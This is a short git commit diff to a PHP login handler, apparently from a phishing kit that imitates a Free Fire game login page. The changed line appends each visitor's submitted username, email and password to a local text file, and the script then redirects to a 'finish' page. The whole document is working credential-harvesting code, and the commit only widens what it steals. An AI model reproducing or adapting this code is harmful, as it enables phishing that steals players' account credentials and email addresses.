098db8703bcd43f9e6c132a771094a3a7ad922e4
Gr3n0xX <74163590+Ch33chOficial@users.noreply.github.com>
2021-01-25 14:59:36 -0300

    Update login.php

--- sites/Freefire/login.php
+++ sites/Freefire/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "Email" . $_POST['email'] ." Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: finish.html');
 exit();
